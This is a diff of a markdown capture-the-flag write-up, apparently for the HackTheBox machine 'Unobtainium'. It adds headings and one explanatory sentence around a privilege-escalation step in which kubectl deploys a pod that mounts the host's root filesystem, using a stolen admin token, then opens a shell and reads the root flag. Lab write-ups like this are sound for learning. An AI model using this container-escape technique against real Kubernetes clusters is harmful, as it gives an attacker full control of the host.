@@ -181,8 +181,9 @@ I choose alpine because it’s smaller, node_server works too.
 
 I’ve added the host filesystem `/` as a mount point inside the container.
 
-Pods (like Docker containers) run until their main command is done. I’ll just add a long sleep as the main command (`tail -f /dev/null` is another good one to hold priority).
+Pods (like Docker containers) run until their main command is done. I’ll just add a long sleep as the main command (`tail -f /dev/null` is another good one to hold priority). And if we don't give it a startup command, it would launch and immediately die.
 
+###### Excute In Pod `exec`
 ```bash
 kubectl apply -f root.yaml --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt
 
@@ -191,6 +192,7 @@ kubectl exec baturu02 --stdin --tty -n kube-system --token $(cat cadmin-token) -
 / # cat mnt/root/root.txt
 ```
 
+###### Shell via launch Pod `get pod`
 ```bash
 kubectl apply -f root2.yaml --token $(cat cadmin-token) --server https://unobtainium.htb:8443 --certificate-authority ca.crt
 
